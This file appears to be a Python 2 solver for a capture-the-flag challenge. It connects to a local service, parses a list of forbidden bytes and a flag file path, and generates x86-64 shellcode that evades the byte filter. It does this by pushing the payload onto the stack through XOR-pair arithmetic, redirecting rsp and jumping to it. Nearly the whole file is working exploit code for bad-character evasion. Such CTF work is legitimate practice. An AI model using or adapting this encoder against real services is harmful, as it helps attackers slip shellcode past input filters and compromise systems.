#!/usr/bin/env python

import argparse
import re
import socket
import sys
import time
from pwn import *

import gen

asm_memo = {}

def asmit(code):
    if code in asm_memo:
        return asm_memo[code]
    asm_memo[code] = asm(code, arch='amd64')
    return asm_memo[code]


W=['ax', 'cx', 'dx', 'bx', 'sp', 'bp', 'si', 'di']

class Solver:
    def __init__(self, filt, flag, check = True):
        self.filt = set()
        for i in range(128):
            self.filt.add(filt[i])
        if len(self.filt) != 128:
            sys.stderr.write('%d != 128' % len(self.filt))
            exit(1)
        self.flag = flag
        self.check = check

        self.code = ''
        self.len = 0

        self.nop_func = ''

        good = set(range(256)) ^ set([ord(x) for x in self.filt])
        if len(good) != 128:
            sys.stderr.write('%d != 128' % len(good))
            exit(1)

        self.xor2 = [False] * 256
        for i in good:
            for j in good:
                self.xor2[i ^ j] = (i, j)
        for i in range(256):
            if not self.xor2[i]:
                print "!?" * 100


    def is_valid(self, code):
        return not (self.filt & set(asmit(code)))


    def get_valid(self, cands):
        a = []
        for cand in cands:
            a.append((len(asmit(cand)), cand))
        a = sorted(a)
        for (_, cand) in a:
            if self.is_valid(cand):
                return cand
        return ''


    def append(self, code):
        self.code += code + '\n'
        self.len += len(asmit(code))


    def append_valid(self, cands):
        cand = self.get_valid(cands)
        if cand:
            self.append(cand)
            return True

        if self.check:
            return False
        self.append(cands[0])
        return True


    def nop(self):
        if self.nop_func:
            self.append(self.nop_func)
            return True
        cands = ['nop', 'sub al, 0', 'xor al, 0', 'or al, 0']
        for c in "abcd":
            cands.append('inc %sl\ndec %sl' % (c,c))
            cands.append('inc %sh\ndec %sh' % (c,c))
            cands.append('and %sl, %sl' % (c,c))
        for w in W:
            cands.append('inc %s\ndec %s' % (w,w))
            cands.append('push %s\npop %s' % (w,w))
        self.nop_func = self.get_valid(cands)
        if self.nop_func:
            self.append(self.nop_func)
            return True
        sys.stderr.write('Failed: nop\n')
        return False


    def set_rsp(self):
        """ rsp <- rip + (0x0500 - 0x0f00) """
        cands = []
        off = 0
        for i in range(5, 0x10):
            if i not in self.filt:
                off = i * 0x100
                cands.append('lea rsp, [rip + %d]' % off)
                break
        if off > 0:
            for w in W:
                cands.append('''call a
                    jmp b
                    a:
                        mov r%s, [rsp]
                        add r%s, %d
                        ret
                    b:
                        mov rsp, r%s''' % (w, w, off, w))
        if self.append_valid(cands):
            return True
        sys.stderr.write('Failed: set_rsp\n')
        return False


    def push(self, l, h):
        c = l * 0x100 + h
        if self.append_valid(['pushw %d' % c]):
            return True

        for w in W:
            if w == 'sp':
                continue
            p = 'pushw %s' % w
            if not self.is_valid(p):
                continue

            cands = [
                    'mov %s, %d' % (w, c),
                    'and %s, %d\nor %s, %d' % (w, c, w, c),
            ]
            cand = self.get_valid(cands)
            if cand:
                self.append(cand)
                self.append(p)
                return True

            set_zero = self.get_valid([
                'xor %s, %s' % (w, w),
                'sub %s, %s' % (w, w),
                'and %s, 0' % w,
                'mov %s, 0' % w,
                'or %s, 0xff\nadd %s, 1' % (w, w),
                'or %s, 0xff\nxor %s, 0xff' % (w, w),
                'or %s, 0xff\nsub %s, 0xff' % (w, w)
            ])
            if not set_zero:
                continue

            # xor
            if self.xor2[h] and self.xor2[l]:
                cand = 'xor %s, %d\nxor %s, %d' % (
                        w, self.xor2[l][0] * 0x100 + self.xor2[h][0], w, self.xor2[l][1] * 0x100 + self.xor2[h][1])
                if self.is_valid(cand):
                    self.append(set_zero)
                    self.append(cand)
                    self.append(p)
                    return True
        
        sys.stderr.write('Failed: push 0x%04x\n' % c)
        return False


    def jmp_rsp(self):
        cands = [
                'jmp rsp',
                'push rsp\nret'
                ]
        for w in W:
            if w == 'sp':
                continue
            cands.append('mov r%s, rsp\njmp r%s' % (w, w))

        if self.append_valid(cands):
            return True
        sys.stderr.write('Failed: jmp_rsp\n')
        return False


    # PIC
    def gen_shellcode(self):
        shellcode = asmit(gen.shellcode(self.flag, 64))
        while len(shellcode) % 2 != 0:
            shellcode += '\x00'

        offset = len(shellcode)

        if not self.set_rsp():
            return ''

        for i in reversed(range(0, len(shellcode), 2)):
            if not self.push(ord(shellcode[i+1]), ord(shellcode[i])):
                return ''

        if not self.jmp_rsp():
            return ''

        if self.len > 1000:
            sys.stderr.write('|shellcode| = %d > 1000!\n' % self.len)
            return ''

        while self.len < 1000:
            if not self.nop():
                return ''

        return self.code


def main():
    parser = argparse.ArgumentParser(description='asg')
    parser.add_argument('--test', dest='test',  action='store_const',
            const=True, default=False, help='Testing of not')
    parser.add_argument('--nocheck', dest='check',  action='store_const',
            const=False, default=True)
    args = parser.parse_args()

    address = 'localhost'
    port = 9025

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((address, port))
    sock.recv(1000) # ignore
    sock.send("\n")

    if args.test:
        time.sleep(0.1) # for sleep 5
    else:
        time.sleep(6)

    s = sock.recv(1000)

    r = re.search(r'these are filtered set of bytes:\n(.*)flag is inside this file: \[(.*)\]', s ,re.DOTALL)

    filt = r.group(1)
    flag = r.group(2)
    if len(filt) != 128:
        sys.stderr.write('len(filt) must be 128, but was %d.' % len(filt))
        exit(1)

    code = Solver(filt, flag).gen_shellcode()
    if not code:
        exit(0)

    sock.send(asmit(code))

    if args.test:
        time.sleep(1.1) # for sleep 1
    else:
        time.sleep(11) # for sleep 10

    print sock.recv(1000) # buena ...

    time.sleep(1)

    print 'flag: ', sock.recv(100)
    exit(1)


if __name__ == "__main__":
    main()
